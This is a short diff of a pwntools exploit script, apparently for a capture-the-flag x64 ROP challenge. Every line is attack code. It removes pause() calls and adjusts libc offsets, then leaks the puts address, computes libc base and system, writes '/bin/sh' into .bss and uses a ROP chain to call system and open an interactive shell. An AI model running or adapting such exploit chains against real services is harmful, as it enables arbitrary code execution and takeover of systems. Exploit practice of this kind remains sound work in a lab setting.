@@ -20,17 +20,16 @@ payload += p64(bss)
 payload += p64(gets_plt)
 payload += p64(main)
 
-pause()
 p.recvuntil(b"Time to do x64 ROP\n")
 p.sendline(payload)
 
 puts_addr = u64(p.recv(6) + b'\x00'*2)
 p.recv(1)
-system = puts_addr - 0x30170
+libc_base = puts_addr - 0x80ed0
+system = libc_base + 0x50d60
 
 log.info("puts: " + hex(puts_addr))
 
-pause()
 p.sendline(b"/bin/sh\x00")
 
 payload = b'A'*120
@@ -38,10 +37,8 @@ payload += p64(pop_rdi)
 payload += p64(bss)
 payload += p64(system)
 
-pause()
 p.recvuntil(b"Time to do x64 ROP\n")
 p.sendline(payload)
 
 
 p.interactive()
-
